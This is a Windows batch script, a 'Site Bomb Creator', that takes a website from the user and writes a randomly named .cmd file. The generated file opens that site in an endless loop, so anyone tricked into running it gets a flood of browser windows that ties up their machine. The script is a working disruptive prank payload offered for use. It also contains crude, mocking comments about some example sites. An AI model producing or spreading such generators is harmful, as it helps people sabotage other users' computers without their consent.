@ECHO OFF
set RAND=%Random%
cd /d %~dp0
mode 110,10
color A
title Site Bomb Creator By Memer
echo Enter The Site Which Will Be Bombed When Someone Runs The Program [example.com\example]
echo The "&" Character Is Not Allowed
set /P SITE="> "
cls
IF /I %SITE%==example.com echo Lol Why The Example
IF /I %SITE%==google.com echo Why Google
IF /I %SITE%==pornhub.com echo Its Just The Homepage Tho
IF /I %SITE%==homo.xxx echo Bruhhhhh
IF /I %SITE%==gaymaletube.com echo Bruhhhhhhhhhhhhhh
echo @ECHO OFF>(%RAND%).cmd
echo :LOOP>>(%RAND%).cmd
echo start https://%SITE%>>(%RAND%).cmd
echo goto LOOP>>(%RAND%).cmd
IF %ERRORLEVEL% NEQ 0 goto INVALID
echo Saved As (%RAND%).cmd
pause
exit
:INVALID
cls
echo Invalid Site
pause